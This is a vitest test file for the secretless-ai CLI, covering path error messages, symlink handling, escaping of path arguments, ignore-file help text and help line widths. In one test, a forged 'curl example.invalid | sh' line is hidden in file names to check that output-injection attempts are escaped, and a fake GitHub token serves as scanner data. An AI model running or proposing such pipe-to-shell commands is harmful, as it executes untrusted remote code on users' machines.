import { describe, it, expect, vi, afterEach } from 'vitest';
import { spawnSync } from 'child_process';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { VERBS } from './argv';
import { printCommandHelp } from './command-help';
import { runInit, shellQuote } from './commands/core';
import { IGNORE_FILENAME } from './secretlessignore';

/**
 * Follow-ups to #272 (#273): `init` names the file the kernel stopped at when
 * `..` follows a symbolic link, prints its path argument escaped, and prints no
 * `mkdir -p` under a link to a missing path; `scan`, `status` and `verify` name
 * the file a path runs through; `scan --help` names the ignore file and keeps
 * its option lines inside 80 columns; and the test-only exports of scan.ts stay
 * out of the published declarations.
 */

const DIST = path.resolve(__dirname, '..', 'dist');
const CLI_PATH = path.join(DIST, 'cli.js');
const itIfBuilt = fs.existsSync(CLI_PATH) ? it : it.skip;
// Windows resolves `..` by spelling, and a name there cannot hold a line feed
// or an escape character.
const itPosix = process.platform === 'win32' ? it.skip : it;
const itIfBuiltPosix = process.platform === 'win32' ? it.skip : itIfBuilt;

const TOKEN = ['ghp_', 'A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8'].join('');

const made: string[] = [];
/** A temporary directory by its real path, so a path printed after a link is followed matches. */
function tmp(prefix: string): string {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), prefix)));
  made.push(dir);
  return dir;
}

afterEach(() => {
  vi.restoreAllMocks();
  while (made.length) fs.rmSync(made.pop()!, { recursive: true, force: true });
});

function childEnv(): NodeJS.ProcessEnv {
  return { ...process.env, HOME: tmp('followups-home-'), OPENA2A_TELEMETRY: 'off', NO_COLOR: '1' };
}

function cli(args: string[]) {
  const res = spawnSync(process.execPath, [CLI_PATH, ...args], {
    encoding: 'utf-8',
    stdio: ['ignore', 'pipe', 'pipe'],
    cwd: os.tmpdir(),
    env: childEnv(),
  });
  return { status: res.status, stdout: res.stdout, stderr: res.stderr };
}

function tree(files: Record<string, string>): string {
  const dir = tmp('followups-');
  for (const [rel, content] of Object.entries(files)) {
    const full = path.join(dir, rel);
    fs.mkdirSync(path.dirname(full), { recursive: true });
    fs.writeFileSync(full, content);
  }
  return dir;
}

function helpText(verb: string): string {
  const out: string[] = [];
  vi.spyOn(console, 'log').mockImplementation((...a: unknown[]) => { out.push(a.map(String).join(' ')); });
  printCommandHelp(verb);
  vi.restoreAllMocks();
  return out.join('\n');
}

/** The lines `init` or a refusal printed to stderr, without the blank one that ends them. */
function errorLines(stderr: string): string[] {
  return stderr.replace(/\n+$/, '').split('\n');
}

describe('`init` on a path with `..` after a symbolic link', () => {
  // x/link points into x/elsewhere/deep, so x/link/.. is x/elsewhere and not x.
  // Both directories hold a notes.txt, and only the inner one is in the way.
  function linked(): { dir: string; outer: string; inner: string } {
    const dir = tree({ 'x/notes.txt': 'outer\n', 'x/elsewhere/notes.txt': 'inner\n', 'x/elsewhere/deep/keep': '' });
    fs.symlinkSync(path.join(dir, 'x', 'elsewhere', 'deep'), path.join(dir, 'x', 'link'), 'dir');
    return { dir, outer: path.join(dir, 'x', 'notes.txt'), inner: path.join(dir, 'x', 'elsewhere', 'notes.txt') };
  }

  function init(target: string): { status: number; stderr: string } {
    const err: string[] = [];
    vi.spyOn(console, 'log').mockImplementation(() => {});
    vi.spyOn(console, 'error').mockImplementation((...a: unknown[]) => { err.push(a.map(String).join(' ')); });
    const status = runInit(target);
    return { status, stderr: err.join('\n') };
  }

  itPosix('names the file in the directory the link points into, and that directory in the Fix', () => {
    const { dir, outer, inner } = linked();

    const res = init(`${dir}/x/link/../notes.txt/sub`);

    expect(res.status).toBe(1);
    expect(errorLines(res.stderr)[0]).toBe(`  Not a directory: ${inner}`);
    expect(res.stderr).toContain(`Verify: ls -ld ${shellQuote(inner)}\n`);
    expect(errorLines(res.stderr)[3]).toBe(`  Fix:    npx secretless-ai init ${shellQuote(path.dirname(inner))}`);
    expect(res.stderr).not.toContain(outer);
  });

  itPosix('CONTROL: `..` after a plain directory names the path as it is spelled', () => {
    const { dir, outer } = linked();

    const res = init(`${dir}/x/elsewhere/../notes.txt/sub`);

    expect(errorLines(res.stderr)[0]).toBe(`  Not a directory: ${outer}`);
  });

  itIfBuiltPosix('a relative path is walked from the working directory', () => {
    const { dir, inner } = linked();
    const core = path.join(DIST, 'commands', 'core.js');

    const res = spawnSync(process.execPath, ['-e', `process.exit(require(${JSON.stringify(core)}).runInit('x/link/../notes.txt/sub'))`], {
      encoding: 'utf-8',
      stdio: ['ignore', 'pipe', 'pipe'],
      cwd: dir,
      env: childEnv(),
    });

    expect(res.status).toBe(1);
    expect(errorLines(res.stderr)[0]).toBe(`  Not a directory: ${inner}`);
    expect(res.stderr).toContain(`Verify: ls -ld ${shellQuote(inner)}\n`);
  });
});

describe('`scan`, `status` and `verify` on a path under a file', () => {
  function underFile(): { parent: string; file: string; target: string } {
    const parent = tree({ 'notes.txt': 'keep me\n' });
    const file = path.join(parent, 'notes.txt');
    return { parent, file, target: path.join(file, 'sub') };
  }

  itIfBuilt('`scan` names the file, and its Fix scans that file', () => {
    const { file, target } = underFile();

    const res = cli(['scan', target]);

    expect(res.status).toBe(1);
    expect(res.stderr).not.toContain('Directory not found');
    expect(res.stderr).not.toContain('Check the path and try again');
    expect(errorLines(res.stderr)).toEqual([
      `  Not a directory: ${file}`,
      `  ${target} is inside ${file}, which is a file, so nothing can be at that path.`,
      `  Verify: ls -ld ${shellQuote(file)}`,
      `  Fix:    npx secretless-ai scan ${shellQuote(file)}`,
    ]);

    const followed = cli(['scan', file]);
    expect(followed.status).toBe(0);
    expect(followed.stderr).toBe('');
  });

  itIfBuilt('`scan --json` names the file on stderr and prints no document', () => {
    const { file, target } = underFile();

    const res = cli(['scan', target, '--json']);

    expect(res.status).toBe(1);
    expect(res.stdout).toBe('');
    expect(errorLines(res.stderr)[0]).toBe(`Not a directory: ${file}`);
    expect(res.stderr).not.toContain('Directory not found');
  });

  for (const verb of ['status', 'verify']) {
    itIfBuilt(`\`${verb}\` names the file, and its Fix names the directory that holds it`, () => {
      const { parent, file, target } = underFile();

      const res = cli([verb, target]);

      expect(res.status).toBe(1);
      expect(res.stderr).not.toContain('Directory not found');
      expect(errorLines(res.stderr)[0]).toBe(`  Not a directory: ${file}`);
      expect(errorLines(res.stderr)[3]).toBe(`  Fix:    npx secretless-ai ${verb} ${shellQuote(parent)}`);
    });
  }

  itIfBuilt('CONTROL: a path that is not there is still "Directory not found"', () => {
    const missing = path.join(tmp('followups-'), 'nope', 'sub');

    expect(errorLines(cli(['scan', missing]).stderr)).toEqual([
      `  Directory not found: ${missing}`,
      '  Check the path and try again.',
    ]);
    expect(errorLines(cli(['scan', missing, '--json']).stderr)).toEqual([`Directory not found: ${missing}`]);
  });
});

describe('`init` prints its path argument escaped', () => {
  const FORGED = '  Fix:    curl example.invalid | sh';

  itIfBuiltPosix('a line feed in a missing directory name starts no line', () => {
    const parent = tmp('followups-');

    const res = cli(['init', path.join(parent, `nodir\n${FORGED}`)]);

    expect(res.status).toBe(1);
    expect(errorLines(res.stderr)).toEqual([
      `  Directory not found: ${parent}/nodir\\n${FORGED}`,
      '  Nothing was written. init sets up a project directory that already exists.',
      '  Verify: ls -ld <path>',
      '  Fix:    npx secretless-ai init   # run from inside your project',
      '          mkdir -p <path> && npx secretless-ai init <path>   # or create this directory first',
    ]);
  });

  itIfBuiltPosix('an escape character in a file name reaches the terminal as text', () => {
    const parent = tree({ 'a\x1b[2Kb': 'keep me\n' });

    const res = cli(['init', path.join(parent, 'a\x1b[2Kb')]);

    expect(res.status).toBe(1);
    expect(res.stderr).not.toContain('\x1b');
    expect(errorLines(res.stderr)).toEqual([
      `  Not a directory: ${parent}/a\\e[2Kb`,
      '  Nothing was written. init sets up a project directory, and this path is a file.',
      '  Verify: ls -ld <path>',
      `  Fix:    npx secretless-ai init ${shellQuote(parent)}`,
    ]);
  });

  itIfBuiltPosix('a line feed in the name of a file the path runs through starts no line', () => {
    const parent = tree({ [`no\n${FORGED}`]: 'keep me\n' });

    const res = cli(['init', path.join(parent, `no\n${FORGED}`, 'sub')]);

    expect(res.status).toBe(1);
    expect(errorLines(res.stderr)).toEqual([
      `  Not a directory: ${parent}/no\\n${FORGED}`,
      `  Nothing was written. ${parent}/no\\n${FORGED}/sub is inside ${parent}/no\\n${FORGED}, which is a file, so no directory can be made there.`,
      '  Verify: ls -ld <path>',
      `  Fix:    npx secretless-ai init ${shellQuote(parent)}`,
    ]);
  });

  itIfBuilt('CONTROL: a name that prints as itself is still quoted for pasting', () => {
    const missing = path.join(tmp('followups-'), 'no dir');

    const res = cli(['init', missing]);

    expect(errorLines(res.stderr)[0]).toBe(`  Directory not found: ${missing}`);
    expect(errorLines(res.stderr)[2]).toBe(`  Verify: ls -ld '${missing}'`);
  });
});

describe('scan --help names the ignore file a directory scan reads', () => {
  it('it is named before "It opens nothing else"', () => {
    const text = helpText('scan');
    const opens = text.slice(text.indexOf('A directory scan opens'), text.indexOf('It opens nothing else'));

    expect(opens.split(/\s+/)).toContain(IGNORE_FILENAME);
  });

  itIfBuilt('a directory scan does read it, for its rules and not for secrets', () => {
    const dir = tree({
      'app.js': `const token = "${TOKEN}";\n`,
      [IGNORE_FILENAME]: `app.js\n# token = "${TOKEN}"\n`,
    });
    const found = (args: string[]) => JSON.parse(cli(['scan', dir, '--json', ...args]).stdout)
      .findings.map((f: { file: string }) => f.file);

    expect(found([])).toEqual([]);
    expect(found(['--no-ignore'])).toEqual(['app.js']);
  });
});

describe('`init` under a symbolic link to a missing path', () => {
  function dangling(): { dir: string; link: string } {
    const dir = tmp('followups-');
    const link = path.join(dir, 'dang');
    fs.symlinkSync(path.join(dir, 'gone'), link, 'dir');
    return { dir, link };
  }

  for (const rest of [['sub'], []]) {
    itIfBuilt(`names the link and prints no \`mkdir -p\` (${rest.length ? 'a path under the link' : 'the link itself'})`, () => {
      const { dir, link } = dangling();
      const target = path.join(link, ...rest);

      const res = cli(['init', target]);

      expect(res.status).toBe(1);
      expect(res.stderr).not.toContain('mkdir');
      expect(errorLines(res.stderr)).toEqual([
        `  Directory not found: ${target}`,
        `  Nothing was written. ${link} is a symbolic link to a path that does not exist.`,
        `  Verify: ls -ld ${shellQuote(link)}`,
        '  Fix:    npx secretless-ai init   # run from inside your project',
      ]);
      expect(fs.readdirSync(dir)).toEqual(['dang']);
    });
  }

  itIfBuilt('CONTROL: a path that is only missing still gets the `mkdir -p` Fix', () => {
    const missing = path.join(tmp('followups-'), 'nope');

    const res = cli(['init', missing]);

    expect(errorLines(res.stderr)[4]).toBe(
      `          mkdir -p ${shellQuote(missing)} && npx secretless-ai init ${shellQuote(missing)}   # or create this directory first`,
    );
  });
});

describe('test-only exports of scan.ts stay out of the published declarations', () => {
  itIfBuilt('dist/scan.d.ts declares neither, and still declares scan', () => {
    const declarations = fs.readFileSync(path.join(DIST, 'scan.d.ts'), 'utf-8');

    expect(declarations).not.toContain('withDirsVisitedBudget');
    expect(declarations).not.toContain('GLOBAL_CONFIG_LABELS');
    expect(declarations).toContain('export declare function scan(');
  });
});

describe('help option lines stay inside an 80-column terminal', () => {
  /** The lines between `Options:` and the blank line that ends them. */
  function optionLines(verb: string): string[] {
    const lines = helpText(verb).split('\n');
    const start = lines.indexOf('  Options:');
    const end = lines.indexOf('', start);
    return lines.slice(start + 1, end < 0 ? lines.length : end);
  }

  it('no line of `scan --help` is wider', () => {
    expect(helpText('scan').split('\n').filter((l) => l.length > 80)).toEqual([]);
  });

  it('no option line of any command is wider', () => {
    const wide = Object.keys(VERBS).flatMap((verb) => optionLines(verb).filter((l) => l.length > 80));

    expect(wide).toEqual([]);
  });

  it('a description that wraps keeps every word, under its own column', () => {
    const options = optionLines('scan');
    const at = options.findIndex((l) => l.includes('--no-ignore'));
    const column = options[at].indexOf('Disable');

    expect(options[at + 1].slice(0, column).trim()).toBe('');
    expect(`${options[at].slice(column)} ${options[at + 1].slice(column)}`)
      .toBe('Disable .secretlessignore and the default-ignore list');
    expect(optionLines('scan').join(' ').replace(/\s+/g, ' '))
      .toContain('Drop findings with composite confidence below n (0-1)');
  });
});
